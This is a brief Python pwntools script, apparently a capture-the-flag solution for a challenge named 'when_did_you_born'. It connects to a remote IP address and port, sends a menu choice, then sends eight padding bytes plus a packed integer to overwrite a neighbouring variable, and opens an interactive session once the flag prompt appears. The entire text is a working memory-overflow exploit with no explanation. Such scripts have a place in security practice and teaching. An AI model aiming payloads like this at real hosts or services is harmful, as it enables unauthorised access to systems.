from pwn import *

p = remote('117.139.247.14', 9514)
# p = process('./when_did_you_born')

pd = 'a' * 8
pd += p64(1926)

p.sendline('1')
p.sendline(pd)
p.recvuntil('Have Flag.\n')
p.interactive()
